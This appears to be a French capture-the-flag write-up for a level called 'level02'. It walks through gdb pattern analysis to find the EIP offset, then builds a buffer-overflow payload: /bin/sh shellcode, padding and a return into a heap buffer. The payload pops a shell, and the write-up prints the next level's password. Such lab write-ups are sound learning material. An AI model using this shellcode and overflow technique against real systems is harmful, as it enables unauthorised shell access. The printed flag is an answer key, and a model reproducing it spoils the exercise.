@@ -1,0 +1,47 @@
+J'ai ouvert le binaire avec gdb
+
+puis creer un patern grace a 
+	pattern_create 200
+puis j'ai run le programme avec ce pattern
+	r < 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
+Il y a un Invalid $PC address: 0xXXXXXXX
+Donc je recherche l'offset ou le return adress est ecrase (EIP)
+	pattern offset AJAA
+		AJAA found at offset: 80
+pettern search est encore plus puissant
+	pattern search
+		Registers contain pattern buffer:
+		EIP+0 found at offset: 80
+		EBP+0 found at offset: 76
+		Registers point to pattern buffer:
+		[EAX] --> offset 0 - size ~200
+		[EDX] --> offset 0 - size ~200
+		[ESP] --> offset 84 - size ~116
+		Pattern buffer found at:
+		0x0804a04b : offset   67 - size  133 ([heap])
+		0xb7fd9043 : offset   67 - size  133 (mapped)
+		0xb7fda000 : offset    0 - size  200 (mapped)
+		0xbffff6ef : offset   67 - size  133 ($sp + -0x11 [-5 dwords])
+		References to pattern buffer found at:
+		0xb7fd1acc : 0xb7fda000 (/lib/i386-linux-gnu/libc-2.15.so)
+		0xb7fd1ad0 : 0xb7fda000 (/lib/i386-linux-gnu/libc-2.15.so)
+		0xb7fd1ad4 : 0xb7fda000 (/lib/i386-linux-gnu/libc-2.15.so)
+		0xb7fd1ad8 : 0xb7fda000 (/lib/i386-linux-gnu/libc-2.15.so)
+		0xb7fd1adc : 0xb7fda000 (/lib/i386-linux-gnu/libc-2.15.so)
+
+Ne pouvant pas ret sur une valeur sur ma stack a cause de :  eax,0xb0000000 cmp    eax,0xb0000000
+je vais ret sur le retour de malloc car son adresse ne commence pas par 0x0b
+shellcode est genere par gdb
+
+
+[SHELLCODE][padding][[EIP ret sur le retour du strdup]
+
+
+python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31" + "\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "A"*56 +"\x08\xa0\x04\x08"' > toto
+
+cat toto - | ./level02
+ET BOOM un shell !
+
+cd /home/user/level3
+cat .pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
